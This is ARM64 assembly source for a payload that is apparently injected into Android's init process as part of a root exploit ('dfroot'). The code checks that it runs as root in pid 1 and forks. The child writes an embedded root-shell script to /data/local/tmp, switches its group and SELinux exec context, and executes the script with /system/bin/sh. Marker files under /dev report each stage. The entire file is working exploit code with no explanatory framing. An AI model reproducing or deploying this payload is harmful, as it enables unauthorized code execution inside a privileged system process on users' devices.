    .arch armv8-a
    .include "include.inc"

    .global init_shell_start
    .global init_shell_data
    .global init_shell_len
    .global init_shell_first_inst_copy
    .data

init_shell_data:
mutex_path:
    .asciz "/dev/dfi"
script_path:
    .asciz "/data/local/tmp/dfroot-root-shell.sh"
attr_exec:
    .asciz "/proc/self/attr/exec"
shell_context:
    .ascii "u:r:shell:s0"
shell_context_end:
shell_path:
    .asciz "/system/bin/sh"
mark_ready:
    .asciz "/dev/dfR"
mark_script_failed:
    .asciz "/dev/dfW"
mark_context_failed:
    .asciz "/dev/dfE"
mark_gid_failed:
    .asciz "/dev/dfG"
mark_exec_failed:
    .asciz "/dev/dfX"
script_data:
    .incbin "root-shell.sh"
script_data_end:

    .balign 4
init_shell_start:
    stp x0, x1, [sp, #-16]!
    stp x2, x3, [sp, #-16]!
    stp x4, x5, [sp, #-16]!
    stp x6, x7, [sp, #-16]!
    stp x8, x9, [sp, #-16]!
    stp x26, x27, [sp, #-16]!
    stp x28, x29, [sp, #-16]!
    str x30, [sp, #-16]!

    mov x8, SYS_getuid
    svc 0
    cbnz w0, return
    mov x8, SYS_gettid
    svc 0
    cmp w0, 1
    bne return

    mov x0, -100
    adr x1, mutex_path
    movl x2, (O_CREAT | O_EXCL | O_CLOEXEC | O_WRONLY)
    mov x3, xzr
    mov x8, SYS_openat
    svc 0
    tbnz w0, #31, return

    sub sp, sp, 16
    mov x8, SYS_clone
    add x4, sp, 8
    mov x3, xzr
    mov x2, xzr
    mov x1, xzr
    movl x0, (CLONE_CHILD_SETTID | CLONE_CHILD_CLEARTID | SIGCHLD)
    svc 0
    str w0, [sp, 8]
    add sp, sp, 16
    cbnz w0, return

    // Materialize the embedded command script while still in init's domain.
    mov x0, -100
    adr x1, script_path
    movl x2, (O_CREAT | O_TRUNC | O_WRONLY)
    movl x3, 0660
    mov x8, SYS_openat
    svc 0
    tbnz w0, #31, script_failed
    mov x26, x0
    adr x1, script_data
    adr x27, script_data_end
    sub x27, x27, x1
    mov x2, x27
    mov x8, SYS_write
    svc 0
    cmp x0, x27
    bne script_failed_close
    mov x0, x26
    mov x8, SYS_close
    svc 0

    mov x0, 2000
    mov x8, SYS_setgid
    svc 0
    cbnz w0, gid_failed

    mov x0, -100
    adr x1, attr_exec
    movl x2, (O_WRONLY | O_CLOEXEC)
    mov x8, SYS_openat
    svc 0
    tbnz w0, #31, context_failed
    mov x26, x0
    adr x1, shell_context
    mov x2, (shell_context_end - shell_context)
    mov x8, SYS_write
    svc 0
    cmp x0, (shell_context_end - shell_context)
    bne context_failed_close
    mov x0, x26
    mov x8, SYS_close
    svc 0

    create_mark mark_ready
    adr x0, shell_path
    sub sp, sp, 32
    str x0, [sp]
    adr x1, script_path
    str x1, [sp, 8]
    str xzr, [sp, 16]
    mov x1, sp
    mov x2, xzr
    mov x8, SYS_execve
    svc 0
    create_mark mark_exec_failed
    b child_exit

script_failed_close:
    mov x0, x26
    mov x8, SYS_close
    svc 0
script_failed:
    create_mark mark_script_failed
    b child_exit
context_failed_close:
    mov x0, x26
    mov x8, SYS_close
    svc 0
context_failed:
    create_mark mark_context_failed
    b child_exit
gid_failed:
    create_mark mark_gid_failed
child_exit:
    mov x0, 1
    mov x8, SYS_exit
    svc 0

return:
    ldr x30, [sp], #16
    ldp x28, x29, [sp], #16
    ldp x26, x27, [sp], #16
    ldp x8, x9, [sp], #16
    ldp x6, x7, [sp], #16
    ldp x4, x5, [sp], #16
    ldp x2, x3, [sp], #16
    ldp x0, x1, [sp], #16
init_shell_first_inst_copy:
    stp x29, x30, [sp, #-32]!
    b init_shell_end
init_shell_end:
init_shell_len:
    .word init_shell_end - init_shell_data
